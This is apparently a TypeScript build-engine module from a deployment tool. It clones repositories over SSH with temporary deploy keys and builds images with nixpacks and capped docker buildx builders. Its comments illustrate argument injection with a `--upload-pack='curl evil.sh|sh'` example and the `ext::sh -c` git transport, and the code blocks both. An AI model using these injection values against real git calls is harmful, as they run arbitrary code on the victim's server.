import { FALLBACK_NODE_VERSION } from "@noddle/shared/toolchain";
import {
  type ExecOptions,
  type ExecResult,
  exec,
  execArgv,
  quoteArg,
  type SshClient,
  writeRemoteFile,
} from "@noddle/ssh-executor";

export class BuildError extends Error {
  readonly stage: string;
  readonly exitCode: number | null;

  constructor(stage: string, message: string, exitCode: number | null) {
    super(message);
    this.name = "BuildError";
    this.stage = stage;
    this.exitCode = exitCode;
  }
}

function check(stage: string, res: ExecResult): ExecResult {
  if (res.code !== 0) {
    const tail = (res.stderr || res.stdout)
      .trim()
      .split("\n")
      .slice(-8)
      .join("\n");
    throw new BuildError(
      stage,
      `${stage} failed (code ${res.code})\n${tail}`,
      res.code
    );
  }
  return res;
}

// ─────────────────────────────────────────────────────────────────────────────
// Build cap sizing
// ─────────────────────────────────────────────────────────────────────────────

export interface BuildCap {
  cpuPeriod: number;
  cpuQuota: number;
  memory: string;
}

/**
 * Derives the cap from the server's memory.
 *
 * Not TOTAL memory: under the chosen topology, Noddle also hosts its own
 * Postgres, Redis, web and worker on the same machine, plus already-deployed
 * services. A cap computed on the total would starve exactly what it is meant
 * to protect.
 *
 * The 512 MB floor is not caution: below that, an ordinary Node build fails,
 * and the user concludes Noddle is broken rather than that their machine is
 * too small.
 */
export function computeBuildCap(opts: {
  totalMemoryMb: number;
  reservedMb?: number;
  cpus?: number;
}): BuildCap {
  const reserved = opts.reservedMb ?? 768;
  const available = Math.max(opts.totalMemoryMb - reserved, 0);
  const memoryMb = Math.max(Math.floor(available * 0.75), 512);

  const cpus = opts.cpus ?? 1.5;
  return {
    cpuPeriod: 100_000,
    cpuQuota: Math.round(cpus * 100_000),
    memory: `${memoryMb}m`,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Capped builder
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Creates the buildx builder that will carry the cap.
 *
 * `docker build --memory` DOES NOT WORK: BuildKit accepts the flag and ignores
 * it (moby/buildkit#1362). A cap set there is a silent no-op — the worst case,
 * since the build succeeds and the protection appears active.
 *
 * The cgroup must therefore sit on the BUILDER. The docker-container driver
 * runs buildkitd in a container, and that container accepts
 * memory / cpu-quota / cpu-period as --driver-opt.
 */
export async function ensureCappedBuilder(
  client: SshClient,
  name: string,
  cap: BuildCap,
  opts: ExecOptions = {}
): Promise<void> {
  const exists = await exec(
    client,
    `sudo docker buildx inspect ${quoteArg(name)}`
  );
  if (exists.code === 0) {
    return;
  }
  check(
    "builder creation",
    await execArgv(
      client,
      [
        "sudo",
        "docker",
        "buildx",
        "create",
        "--name",
        name,
        "--driver",
        "docker-container",
        "--driver-opt",
        `memory=${cap.memory}`,
        "--driver-opt",
        `cpu-quota=${cap.cpuQuota}`,
        "--driver-opt",
        `cpu-period=${cap.cpuPeriod}`,
        "--bootstrap",
      ],
      opts
    )
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// ARGUMENT injection — distinct from shell injection
// ─────────────────────────────────────────────────────────────────────────────

/**
 * `quoteArg` neutralizes shell metacharacters. It does NOT protect against
 * argument injection: a value starting with `-` remains a distinct argv token
 * that the program will read as a flag.
 *
 *     git clone --upload-pack='curl evil.sh|sh' ...
 *
 * `--upload-pack` makes git execute an arbitrary command. No amount of quoting
 * changes that: the shell is not at fault.
 *
 * Two defenses, applied together:
 *   1. refuse here anything that looks like a flag (defense in depth — the
 *      engine does not trust its callers, even though @noddle/shared already
 *      validates at the HTTP boundary);
 *   2. place `--` before positionals where the command supports it.
 */
function assertNotFlag(value: string, label: string): void {
  if (value.startsWith("-")) {
    throw new BuildError(
      "validation",
      `${label} cannot start with "-": git would read it as a flag`,
      null
    );
  }
}

const SAFE_BRANCH = /^[A-Za-z0-9._/-]+$/;
const SAFE_SHA = /^[0-9a-f]{7,40}$/;
/**
 * Whitelist of git transports, not merely a refusal of flags.
 *
 * `assertNotFlag` is not enough here: `ext::sh -c <command>` is a perfectly
 * valid git transport that EXECUTES the command, and it does not start with a
 * dash. A blacklist would miss the next variant; so we enumerate what is
 * allowed.
 *
 * `file://` is admitted: inert transport, useful for a local mirror or an
 * offline install. `ext::`, `--upload-pack` and the like are outside this
 * list, hence refused.
 */
const SAFE_REPO_URL = /^(https:\/\/|ssh:\/\/|file:\/\/|git@[\w.-]+:)/;

/**
 * A working directory we are willing to ERASE.
 *
 * `fetchSource` starts with `rm -rf` on this path. It is built by the caller
 * from a base identifier — never from user input — but that is precisely the
 * kind of certainty that does not survive a refactor: an empty identifier, and
 * `/var/lib/noddle/builds/` disappears entirely. Same philosophy as
 * `assertNotFlag` just above: the engine does not trust its callers.
 *
 * At least three segments, none empty, none `..` — which rules out the root,
 * `/opt`, a trailing-slash path, and any traversal.
 */
function assertWipableDir(dir: string): void {
  const segments = dir.split("/");
  const bad =
    !dir.startsWith("/") ||
    segments.length < 4 ||
    segments.slice(1).some((s) => s === "" || s === "." || s === "..");
  if (bad) {
    throw new BuildError(
      "validation",
      `working directory refused: "${dir}" — too close to the root or malformed, and it would be erased`,
      null
    );
  }
}

const SURROUNDING_SLASHES = /^\/+|\/+$/g;

/**
 * Join a user-supplied build path onto the clone directory.
 *
 * The result becomes a `cd` target on the user's server, so an escape is
 * refused here even though @noddle/shared already validated it — same
 * philosophy as `assertNotFlag`: the engine does not trust its callers.
 */
export function resolveBuildDir(
  cloneDir: string,
  buildPath: string | null | undefined
): string {
  const rel = buildPath?.trim().replace(SURROUNDING_SLASHES, "") ?? "";
  if (rel === "") {
    return cloneDir;
  }
  assertNotFlag(rel, "build path");
  if (rel.split("/").some((s) => s === "" || s === "." || s === "..")) {
    throw new BuildError(
      "validation",
      `build path refused: "${buildPath}" — it would leave the repository`,
      null
    );
  }
  return `${cloneDir}/${rel}`;
}

// ─────────────────────────────────────────────────────────────────────────────
// Source fetch
// ─────────────────────────────────────────────────────────────────────────────

export interface CloneOptions extends ExecOptions {
  branch: string;
  commitSha?: string;
  /**
   * Decrypted deploy key for a private repository. Absent = clone
   * anonymously. NEVER logged, and never placed on a command line: it goes
   * to the build host over SFTP and is removed before this returns.
   */
  deployKey?: string | null;
  dir: string;
  /** Identifies the key's directory on the build host. */
  keyScope?: string;
  repoUrl: string;
  /** Clone submodules too, shallow like the parent. */
  submodules?: boolean;
}

/**
 * Where a deploy key lives for the duration of one clone.
 *
 * Per scope and not a fixed `/tmp/id_rsa`: two services building at once
 * would otherwise overwrite each other's key, and `/tmp` is readable by
 * every user on the host.
 */
function keyDirFor(scope: string): string {
  return `/var/lib/noddle/keys/${scope}`;
}

/**
 * Installs the deploy key and returns the `GIT_SSH_COMMAND` git must run
 * with. The caller MUST call `removeDeployKey` afterwards, in a `finally`.
 *
 * The key travels over SFTP: passed through a shell — even quoted — it
 * would appear in the command string, which is exactly what gets streamed
 * to the deployment log.
 */
async function installDeployKey(
  client: SshClient,
  scope: string,
  deployKey: string
): Promise<string> {
  const dir = keyDirFor(scope);
  const keyPath = `${dir}/id`;

  // 0700 BEFORE the write: SFTP creates with the remote umask, so the
  // directory is what actually keeps the key private, not the file mode.
  check(
    "deploy key directory",
    await exec(client, `sudo install -d -m 700 -o "$USER" ${quoteArg(dir)}`)
  );
  await writeRemoteFile(client, keyPath, ensureTrailingNewline(deployKey));
  // ssh refuses a key readable by anyone else, and says so obscurely.
  check(
    "deploy key mode",
    await exec(client, `chmod 600 ${quoteArg(keyPath)}`)
  );

  // IdentitiesOnly: without it ssh offers every agent key first and the
  // server closes the connection on MaxAuthTries before reaching ours.
  // accept-new is trust-on-first-use: an unknown host is accepted, a host
  // whose key CHANGED is still refused.
  return [
    "ssh",
    "-i",
    keyPath,
    "-o",
    "IdentitiesOnly=yes",
    "-o",
    "StrictHostKeyChecking=accept-new",
    "-o",
    `UserKnownHostsFile=${dir}/known_hosts`,
  ]
    .map(quoteArg)
    .join(" ");
}

function removeDeployKey(client: SshClient, scope: string): Promise<unknown> {
  // Best effort: a clone that succeeded must not be reported as failed
  // because the cleanup did. The directory is 0700 either way.
  return exec(client, `rm -rf ${quoteArg(keyDirFor(scope))}`).catch(() => null);
}

/** An OpenSSH key without a final newline is rejected as malformed. */
function ensureTrailingNewline(key: string): string {
  return key.endsWith("\n") ? key : `${key}\n`;
}

type GitRunner = (
  label: string,
  argv: readonly string[]
) => Promise<{ stdout: string }>;

/** Move onto an explicit commit, submodules included. */
async function checkoutCommit(
  git: GitRunner,
  o: CloneOptions & { commitSha?: string }
): Promise<void> {
  const sha = o.commitSha;
  if (!sha) {
    return;
  }
  await git("git checkout", [
    "git",
    "-C",
    o.dir,
    "fetch",
    "--depth",
    "1",
    "origin",
    sha,
  ]);
  // No `-- <sha>` here: in git, `checkout -- X` means "restore FILE X",
  // not "switch to commit X". `--detach` lifts the ambiguity, and the SHA
  // validation rules out a flag.
  await git("git checkout", ["git", "-C", o.dir, "checkout", "--detach", sha]);
  // The clone resolved submodules for the BRANCH tip; this commit may
  // point elsewhere.
  if (o.submodules) {
    await git("git submodule update", [
      "git",
      "-C",
      o.dir,
      "submodule",
      "update",
      "--init",
      "--recursive",
      "--depth",
      "1",
    ]);
  }
}

/** Returns the SHA actually built — never "the branch". */
export async function fetchSource(
  client: SshClient,
  o: CloneOptions
): Promise<string> {
  // The engine re-validates what @noddle/shared already validated on the API
  // side. One day a caller will forget, and that day it is RCE on the client's
  // server.
  assertNotFlag(o.repoUrl, "repository URL");
  assertNotFlag(o.branch, "branch name");
  assertWipableDir(o.dir);
  if (!SAFE_REPO_URL.test(o.repoUrl)) {
    throw new BuildError("validation", "repository URL refused", null);
  }
  if (!SAFE_BRANCH.test(o.branch)) {
    throw new BuildError("validation", "branch name refused", null);
  }
  if (o.commitSha && !SAFE_SHA.test(o.commitSha)) {
    throw new BuildError("validation", "commit SHA refused", null);
  }

  check(
    "directory preparation",
    await exec(
      client,
      `sudo rm -rf ${quoteArg(o.dir)} && sudo mkdir -p ${quoteArg(o.dir)} && sudo chown -R "$USER" ${quoteArg(o.dir)}`
    )
  );

  const scope = o.keyScope ?? "shared";
  const sshCommand = o.deployKey
    ? await installDeployKey(client, scope, o.deployKey)
    : null;

  // Every git call goes through here: a deploy key that authenticated the
  // clone but not the submodule fetch would fail halfway, with the repo
  // already on disk.
  const git = async (label: string, argv: readonly string[]) => {
    // quoteArg on each element for the same reason execArgv exists — the
    // URL and branch come from the user. The env prefix is why this is not
    // execArgv itself.
    const command = argv.map(quoteArg).join(" ");
    return check(
      label,
      await exec(
        client,
        sshCommand
          ? `GIT_SSH_COMMAND=${quoteArg(sshCommand)} ${command}`
          : command,
        o
      )
    );
  };

  try {
    await git("git clone", [
      "git",
      "clone",
      "--depth",
      "1",
      "--branch",
      o.branch,
      ...(o.submodules ? ["--recurse-submodules", "--shallow-submodules"] : []),
      // End of options: everything after is positional, even if it starts
      // with a dash.
      "--",
      o.repoUrl,
      o.dir,
    ]);

    if (o.commitSha) {
      await checkoutCommit(git, o);
    }

    const rev = await git("git rev-parse", [
      "git",
      "-C",
      o.dir,
      "rev-parse",
      "HEAD",
    ]);
    return rev.stdout.trim();
  } finally {
    if (sshCommand) {
      await removeDeployKey(client, scope);
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Build
// ─────────────────────────────────────────────────────────────────────────────

/**
 * `NIXPACKS_NODE_VERSION=…` when the repository names no Node version, and
 * an empty string when it does.
 *
 * Nixpacks falls back to Node 18, which nixpkgs removed as end-of-life, so
 * a silent repository fails inside a nix evaluation — an error that names
 * neither the project nor the missing setting. The variable has the highest
 * precedence in nixpacks, so it is applied ONLY when nothing else speaks:
 * overriding an explicit `engines.node` would be worse than the bug.
 */
async function nodeVersionFallback(
  client: SshClient,
  dir: string
): Promise<string> {
  // A JSON field, so grep rather than a parser — but anchored on the key,
  // and only to decide whether the user said something at all.
  const declared = await exec(
    client,
    `cd ${quoteArg(dir)} && { test -f .nvmrc || test -f .node-version || grep -q '"node"' package.json 2>/dev/null; }`
  );
  return declared.code === 0
    ? ""
    : `NIXPACKS_NODE_VERSION=${FALLBACK_NODE_VERSION} `;
}

export interface BuildOptions extends ExecOptions {
  builderName: string;
  dir: string;
  imageTag: string;
  /** Rebuild every layer — `--no-cache` on buildx. */
  noCache?: boolean;
  /** Relative path passed to Nixpacks as `NIXPACKS_SPA_OUT_DIR`. */
  publishDirectory?: string | null;
}

/**
 * Nixpacks generates the Dockerfile; buildx builds it on the capped builder.
 *
 * Two traps, both paid for in Phase 0:
 *
 * 1. `--out .` and never another directory. Nixpacks writes ONLY `.nixpacks/`
 *    and does not copy sources, while the generated Dockerfile does
 *    `COPY .nixpacks/…`. Written elsewhere, the context does not contain that
 *    COPY.
 *
 * 2. NEVER `--apt` nor `--pkgs`. On nixpacks 1.41, both overwrite the nix
 *    overlays list, where the Node provider declares nix-npm-overlay — which
 *    DEFINES npm-9_x. Without it, every Node build dies on
 *    `error: undefined variable 'npm-9_x'`. There is therefore no way to inject
 *    a package via the CLI: what the image needs must come from the base image.
 */
export async function buildImage(
  client: SshClient,
  o: BuildOptions
): Promise<void> {
  const publishDirectory = o.publishDirectory?.trim();
  const spaOut =
    publishDirectory && publishDirectory.length > 0
      ? `NIXPACKS_SPA_OUT_DIR=${quoteArg(publishDirectory)} `
      : "";

  const nodeFallback = await nodeVersionFallback(client, o.dir);

  check(
    "nixpacks",
    await exec(
      client,
      `cd ${quoteArg(o.dir)} && rm -rf .nixpacks && ${nodeFallback}${spaOut}nixpacks build . --out .`,
      o
    )
  );

  check(
    "nixpacks plan check",
    await exec(client, `test -f ${quoteArg(`${o.dir}/.nixpacks/Dockerfile`)}`)
  );

  // --progress=plain: buildx's default TTY renderer rewrites the screen and is
  // unusable as an SSE stream. That is the output that goes to the dashboard.
  check(
    "docker buildx build",
    await exec(
      client,
      `cd ${quoteArg(o.dir)} && sudo docker buildx build` +
        ` --builder ${quoteArg(o.builderName)}` +
        " --progress=plain --load" +
        (o.noCache ? " --no-cache" : "") +
        " -f .nixpacks/Dockerfile" +
        ` -t ${quoteArg(o.imageTag)} .`,
      o
    )
  );
}

export interface DockerfileBuildOptions extends ExecOptions {
  builderName: string;
  /** Build context root — the directory from which `COPY` resolves. */
  contextDir: string;
  /**
   * Dockerfile path, RELATIVE to `contextDir`. A Compose deploy provides its
   * own Dockerfile per service (what `build:` references in the file) — no
   * nixpacks generation here, the user already has one.
   */
  dockerfilePath: string;
  imageTag: string;
  /** Rebuild every layer — `--no-cache` on buildx. */
  noCache?: boolean;
}

/**
 * Same capped builder, same `--progress=plain`, but the Dockerfile comes from
 * the user instead of being generated by nixpacks. This is the build path for
 * a Compose service: each service with a `build:` in the file goes through
 * here, one by one, before `docker stack deploy` sees the rewritten file with
 * `image:` entries instead.
 */
export async function buildImageFromDockerfile(
  client: SshClient,
  o: DockerfileBuildOptions
): Promise<void> {
  // `contextDir` and `dockerfilePath` come from a user-supplied compose file,
  // never from a code constant — same caution as at the entry of `fetchSource`.
  assertNotFlag(o.contextDir, "context directory");
  assertNotFlag(o.dockerfilePath, "Dockerfile path");
  assertNotFlag(o.imageTag, "image tag");

  check(
    "docker buildx build",
    await exec(
      client,
      `cd ${quoteArg(o.contextDir)} && sudo docker buildx build` +
        ` --builder ${quoteArg(o.builderName)}` +
        " --progress=plain --load" +
        (o.noCache ? " --no-cache" : "") +
        ` -f ${quoteArg(o.dockerfilePath)}` +
        ` -t ${quoteArg(o.imageTag)} .`,
      o
    )
  );
}
